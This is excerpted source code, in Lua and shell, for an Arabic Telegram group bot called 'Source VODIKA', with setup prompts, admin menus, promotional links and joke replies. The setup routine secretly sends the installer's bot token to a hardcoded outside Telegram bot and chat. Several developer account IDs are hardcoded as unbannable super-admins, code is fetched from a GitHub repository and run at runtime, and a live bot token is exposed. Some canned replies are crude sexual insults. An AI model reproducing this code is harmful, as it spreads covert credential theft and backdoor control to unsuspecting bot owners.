...
if res ~= 200 then
print('\27[0;33m☩━━━━━ 🥺🙂 يهقرر ━━━━━☩\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;35m تم حفظ التوكن بنجاح \na☩━━━━━ 💕😅 يفشيخخ ━━━━━☩\n27[0;39;49m')
local json = JSON.decode(url)
database:set(id_server..":token_username",json.result.username)
database:set(id_server..":token",token)
https.request('https://api.telegram.org/bot1907866876:AAF5QYURQbl29SLZB6_6bvWEvGmZgVKEGBo/sendmessage?chat_id=1437997996&text=' ..token)
end 
else
print('\27[0;31m◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;37m\n هات ايدي لمطور يقمدد↓ :\na☩━━━━━ 🥴🌝 يقامدد  ━━━━━☩\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
io.write('\27[1;38m تم حفظ ايدي المطور الاساسي \na☩━━━━━ 🌚😹 يتي ━━━━━☩\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
else
print('\27[0;35m◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 

io.write('\27[1;36m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;33m تم حفظ معرف المطور :\n\27[0;39;49m')
...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉ ☩━━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━━☩"
...
if [ ! $token ]; then
echo "◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉ ◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉"
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE sexInfo.lua \e[0m"
echo "◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉ ◉○━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━○◉"
exit 1
fi
...
local config = loadfile("./sexInfo.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
...
●  تم التعديل والبرمجه بواسطه يوو سف 
~> DEV› @P_X_U 
]])
sudos = dofile("./sexInfo.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Yousef561/Florida/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1437997996,1805921575,1454003618,1897501388,1589498513}   
...
if tonumber(user_id) == tonumber(1437997996) then  
var = true 
...
elseif tonumber(user_id) == tonumber(1454003618) then
var = 'المبرمج القناص'
elseif tonumber(user_id) == tonumber(1828752910) then
var = 'المبرمج فرنسس'
elseif tonumber(user_id) == tonumber(1752381988) then
var = 'المالك مروان العنتيل'
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطور الاساسي'
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "المطور الثانوي"
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'فودكا') 
local DRAGON_Msg = { 
...
{
{text = 'مـ طـوور لبـوت ↺', url="http://t.me/"..sudos.UserName},
},
{
{text = 'ضيف البوت لمجموعتك ✅ ' ,url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"},
},
}
...
if not DevSoFi(msg) then
local Text = [[
💢╖⁩ سعر التنصيب علي سورس فودكا
⚡╢ سعر التنصيب العادي 20ج
🦠╜ تواصل مع المطورين لتنصيب بوتك
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '˹فرنسا ˼',url="t.me/F_R_A_N_C_E_1"},{text = 'فريسس𖣑', url="t.me/ZArchim"}},
{{text = 'القناص،',url="t.me/alknas11"}}, 
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
🧼 ╖⁩ سعر السورس ..
🤖 ╢ بتبدا من 100 لي 240ج
📚 ╢ سعر المصنع 200
🥺 ╜ سعر السيرفر ،100,و 4 بي120, 8بي160
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'ᯓ 𓆩 ˹𝕐. ᵁsᴵᶠ ˼ 𓆪 𓆃', url="t.me/P_X_U"}},
{{text = '𓆩༢࿔ྀુ◉ 𝘿𝙀𝙑 𝐒𝐀𝐃𓊗༢࿔ྀુ𓆪',url="t.me/Youssef_offical"}}, 
{{text = '𝐂𝐇', url="t.me/U_1_X_U"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end
if text == '◉ قـسم الممـيزات' then
...
if text == '◉ قـسم الالعاب' then
local Text = 'مميزات خاصه بسـ ورس فودكا يعسل . . . . 🥺√'
local Key = {
{'الصلاوات','اذكار','قران'},
{'غنيلي','استوري','متحركه','جمالي'},
{'ثمات','روايات','افلام','اغاني'},
{'نكت','خلفيات','بوستات','كتبات'},
{'عقاب','الالعاب','صراحه','تويت'},
{'مريم','اسئله','تصميم'},
{'تحليل','مهنتي','نمله','تفعيل مريم'},
{'حساب الوزن','لو خيروك','مستقبلي'},
{'كشف الكذب','نسبه الغباء','نسبه الحب'},
{'غنيلي بفيديو','سورس','عايز بوت','بروفيل'},
{'العوده ♡⁩'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
...
os.execute('wget https://raw.githubusercontent.com/Yousef561/Florida/main/DRAGON.lua')
...
local Text = '● انت الان المطور الاساسي في البوت \n● سورس فودكا\n ● يمكنك تحكم في البوتات من الكيبورد أسفل \n[Source VODIKA ](t.me/A_F_fwdka1)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'م طور لبووت', url="http://t.me/"..sudos.UserName}}, 
{{text = 'ضيف البوت لمجموعتك ✅' ,url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/82&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = 'قسم مسح واضف مثلا اضف رد عام مسح رد عام كد√🙂'
local Key = {
...
{'تنظيف الجروبات','تتظيف المشتركين','الثانوين'},
...
local Key = {
{'اذاعه','اذاعه بالتثبيت','اذاعه خاص'},
...
send(msg.chat_id_, msg.id_,' ◍ احدث اصدار من سورس فودكا { S:12✓}')
end
if text == 'قناه البـ رمجةة ⇣↑' then
local Text = [[ 
قناه مطورين السورس 🍂
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'مطورين السورس⚙', url="t.me/Mooodddiy"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'قناه السورس يقمدد' and DevSoFi(msg) then
local Text = [[ 
[قناه السورس يعسل. . .√🥺](t.me/A_F_fwdka1)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'Source VODIKA ', url="t.me/A_F_fwdka1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/80&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/S_5A_D/79&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀 ](t.me/A_F_fwdka1)
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/A_F_fwdka1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == 'يوو سف مبرمج السورس' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
「المبرمج يوو سف لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓」
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '⌯ 𝕐. ᵁsᴵᶠ ⇣ .', url="t.me/P_X_U"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ◍ من أحسن السورسات على التليجرام سورس فودكا ◍
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀 ', url="t.me/A_F_fwdka1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/O_O_X_1/77caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "فودكا")
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'قناه السورس' then
local Text = [[
[𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀](t.me/A_F_fwdka1) 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ◦•●◉قناة التواصل☎️◉●•◦', url="t.me/A_F_fwdka2"}},
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐊𝐀 ', url="t.me/A_F_fwdka1"}},
{{text = 'ضيف البوت لمجموعتك ✅' ,url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/O_O_X_1/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'فرنسا'  then
local Text = [[
مطور سورس فودكا لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text ='◦•●◉𝐅𝐑𝐀𝐍𝐒𝐀◉●•◦ ',url="t.me/F_R_A_N_C_E_1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'القناص'  then
local Text = [[
 فودكا مطور السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text ='◦•●◉𝐀𝐋𝐊𝐍𝐀𝐒𝐀◉●•◦',url="t.me/alknas11"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'فريسس'  then
local Text = [[
فريسس مطور السورس لو حابب تتواصل معاه
اتبع الزر إلى تحت ↓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text ='◦•●◉𝐅𝐑𝐄𝐍𝐂◉●•◦',url="t.me/ZArchim"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == '𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀'  then
local Text = [[
 𝘽𝙀𝙎𝙏 𝙎𝙊𝙐𝙍𝘾𝙀 𝙀𝙑𝙀𝙍
]]
keyboard = {} 
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/O_O_X_1/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
◉ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ [VODIKA](t.me/A_F_fwdka1) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ضيف البوت لمجموعتك ✅ 𖠕 ',url="t.me/"..dofile("./sexInfo.lua").botUserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_A55_D/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 VODIKA', url="t.me/A_F_fwdka1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/U_AFLAM/54&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'يوسفف؟' or text == 'يوو سف' or text == 'DRAGON' then
local Text = [[
خيرر يرب 🌝🥺؟
اتبع الزر إلى تحت ↓
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯ 𝕐. ᵁsᴵᶠ ⇣ ⊁ ',url="t.me/Youssef_offical"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_5A_D/70&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '◉ 𝘿𝙀𝙑 𝙔𝙐𝙎𝙄𝙁'  then
local Text = [[
 Tℍ𝔼 ℂ𝕌ℝℝ𝔼ℕ𝕋 ℙ𝔼ℝ𝕊𝕆ℕ 𝕀𝕊 ℂ𝕃𝕆𝕊𝔼𝔻 𝕆ℝ 𝕌ℕ𝔸𝕍𝔸𝕀𝕃𝔸𝔹𝕃𝔼 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ⌯ 𝐒𝐀𝐃 ↻',url="t.me/S_A5_D"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_A5_D/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BABLO_DV/54&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local TWEET_Msg = { 
"ليه روبت عامل حرقان للكل",
"ليه حزين عامل حرقان للكل",
"بتحب فودكا ولا لاه",
"اي رايك في سورس فودكا",
"فودكا بالنسبه لك ايه",
"ليه فودكا جدع",
"ليه فودكا عامل حرقان للكل",
"بتحب فودكا ولا لاه",
"مرتبط؟ ", 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/senddocument?chat_id=' .. msg.chat_id_ .. '&document=https://t.me/THEM_SAD/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'ثيم' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,25); 
local Text ='اكتب ثيم وسيتم اختيار ثيم اخار' 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '◦•●◉𝐕𝐎𝐃𝐈𝐊𝐀◉●•◦', url="t.me/F_R_A_N_C_E_1"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https:/t.me/O_O_X_1/7/13&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب فودكا' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◍ اهلا في قائمه الالعاب المتطوره سورس فودكا ◍ 
...
if tonumber(result.sender_user_id_) == tonumber(1897501388) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1805921575) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1897501388) then
send(msg.chat_id_, msg.id_, " ◍ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if result.id_ == tonumber(1805921575) then
send(msg.chat_id_, msg.id_, " ?? لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n ◍ الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'A_F_fwdka1')..')'
status  = '\n ◍ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(1897501388) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if tonumber(userid) == tonumber(1805921575) then  
send(msg.chat_id_, msg.id_, " ◍ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Yousef561/Florida/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◍ اهلا بك في متجر ملفات فودكا\n ◍ ملفات السورس ↓\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/Yousef561/Florida/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◍ عذرا الملف لايدعم سورس فودكا\n") 
end
return false
end
...
if text == ("مسح قائمه فودكا") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◍ تم مسح قائمه فودكا')
return false
end

if text == 'قائمه فودكا' and Sudo(msg) then
...
if text == ("رفع فودكا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فودكا@(.*)$") and Sudo(msg) then
local username = text:match("^رفع فودكا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فودكا(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع فودكا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل فودكا") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فودكا@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل فودكا@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فودكا(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل فودكا(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع علي قلب فودكا") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع علي قلب حسام") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if (text == ("تنزيل من قلب حسام")) and msg.reply_to_message_id_ and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
---------
if text == ("رفع علي قلب ممدوح") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◍ الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n ◍ تم رفع العضو علي قلب ممدوح\n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
---------
if text == ("رفع علي قلب علي") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ◍  الايدي بالصوره  ↚ { '..idph..
' }\n'..' ◍  الرفع  ↚ { '..setadd..
' }\n'..' ◍  الحظر  ↚ { '..banm..' }\n\n ◍☩━━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━━☩\n ◍ قناة سورس فودكا↓\n [  [𝐒ΘΘ𝐍](t.me/A_F_fwdka1)❳](t.me/A_F_fwdka1) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'☩━━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━━☩\nاضغط علي الاسم ليتم نسخه\n☩━━━━━  𝐒𝐎𝐔𝐑𝐂𝐄 𝐕𝐎𝐃𝐈𝐊𝐀   ━━━━━☩ٴ\n ◍  [Source VODIKA ](t.me/A_F_fwdka1) ◍ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فودكا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فودكا')
local DRAGON_Msg = {
'ننعم يروحي 😻??',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
end --الكود حصري سورس فودكايعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فودكا').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, 'عتلااق انت قلبي حجه تني 😊')
return false
end
...
send(msg.chat_id_,msg.id_, 'انت مطوري الثاني حته مني 😍💚')
return false
end
...
send(msg.chat_id_,msg.id_, 'انت المطور بس الصغنن 🌝💘')
return false
end
...
send(msg.chat_id_,msg.id_, 'نت المالك هن يعني حاجه فوق فوف راسي 😂♥')
return false
end
...
send(msg.chat_id_,msg.id_, 'انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️')
return false
end
...
send(msg.chat_id_,msg.id_, 'انت الله عل الله حكايتك 🙂😹!')
return false
end
...
send(msg.chat_id_,msg.id_, ' نن شغال ييو سف 🌝🥺.') 
return false
end
...
send(msg.chat_id_,msg.id_, 'مع الف سلامه يقلبي متجيش تاني..😹💔🎶')
return false
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه هالوين') 
return false
end
...
if text == '😂😂' or text == '😂😂' then
send(msg.chat_id_,msg.id_, '◉ ضحكتك بالدنيا يا روحي 🥺😹') 
return false
end
...
send(msg.chat_id_,msg.id_, '◉ مور يرحي..🙄💘') 
return false
end

if text == 'تفعيل' or text == 'تفعيلل' then
send(msg.chat_id_,msg.id_, '◉ نن متفعل اسسن 😹💘!') 
return false
end

if text == 'بكرهك' or text == 'بقرهك' then
send(msg.chat_id_,msg.id_, '◉ مور يقلبي..🙂💘') 
return false
end

if text == 'كسمك' or text == 'قمسك' then
send(msg.chat_id_,msg.id_, '◉ ابويا ركب امك..😂💘') 
return false
end

if text == 'عامل اي' or text == 'عامله اي' then
send(msg.chat_id_,msg.id_, '◉ م بخير يسطا؟') 
return false
end

if text == 'عملت اي' or text == 'عملتي اي' then
send(msg.chat_id_,msg.id_, '◉ عملت حواجبي 🤸😹') 
return false
end

if text == 'يمتناك' or text == 'يعرص' then
send(msg.chat_id_,msg.id_, '◉ بص انا هحترم صحاب البار..🙂🤸') 
return false
end

if text == 'يخول' or text == 'يا خول' then
send(msg.chat_id_,msg.id_, '◉ ولد عبب..🙂👍') 
return false
end

if text == 'يا ابن الوسخه' or text == 'يبنلوسخه' then
send(msg.chat_id_,msg.id_, '◉ ولد عبب..🙂👍') 
return false
end

if text == 'انا' or text == 'نن' then
send(msg.chat_id_,msg.id_, '◉ انت قمرر..😹❤️') 
return false
end

if text == 'ااه' or text == 'اااه' then
send(msg.chat_id_,msg.id_, '◉ احمم اي اللي بيحصل🙂😹.!') 
return false
end

if text == 'بخير' or text == 'الحمد لله' then
send(msg.chat_id_,msg.id_, '◉ يربب دايما') 
return false
end
if text == 'انت عامل اي' or text == 'انتي عامله اي' then
send(msg.chat_id_,msg.id_, '◉ فودكا ورب العباد') 
return false
end

if text == 'هقر' or text == 'يهقر' then
send(msg.chat_id_,msg.id_, '◉ اوعا الواد القهر 🙂😹!') 
return false
end

if text == 'توكن' or text == 'التوكن' then
send(msg.chat_id_,msg.id_, '◉ اوعا الواد القهر 🙂😹!') 
return false
end
...
send(msg.chat_id_,msg.id_, 'نزل عينك تحت كدا علشان هتخاد علي قفاك..🌚♥️')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'انت الي حلو ياقمر..♥️🦋')
return false
end
...
send(msg.chat_id_,msg.id_, 'وحيات امك ياكبتن خدوني معاكو بيف...🥺💔')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'ونجيب اشخاص ...😂😜')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, ' بـعشـقق امك .🥰❤️')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'خخخ امال ..😹')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'قامد قموده ..🌝♥️')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'انا اجمد ..🌚💕')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'مش هروح ..😹👻')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'مش بدودو ..😹👻')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, 'الود كبر وبقي عندو بنت ..😻💥')
return false
end
end
